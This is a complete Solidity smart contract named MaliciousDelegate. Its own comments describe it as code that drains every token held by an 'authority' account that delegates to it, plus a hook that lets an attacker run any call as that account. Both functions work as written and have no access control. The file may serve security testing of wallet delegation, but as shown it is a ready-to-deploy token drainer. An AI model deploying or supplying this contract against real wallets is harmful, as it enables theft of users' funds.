pragma solidity 0.8.17;

contract MaliciousDelegate {
    /// @notice Malicious function that drains all tokens owned by the authority account
    function sweep(address token, address to) external {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(ok, "balanceOf failed");
        uint256 balance = abi.decode(data, (uint256));

        if (balance > 0) {
            (bool okTransfer,) = token.call(
                abi.encodeWithSignature("transfer(address,uint256)", to, balance)
            );
            require(okTransfer, "transfer failed");
        }
    }

    /// @notice Arbitrary execution hook allowing attacker to execute any call as the authority
    function execute(address target, uint256 value, bytes calldata data) external payable {
        (bool ok,) = target.call{value: value}(data);
        require(ok, "execute failed");
    }

    receive() external payable {}
    fallback() external payable {}
}
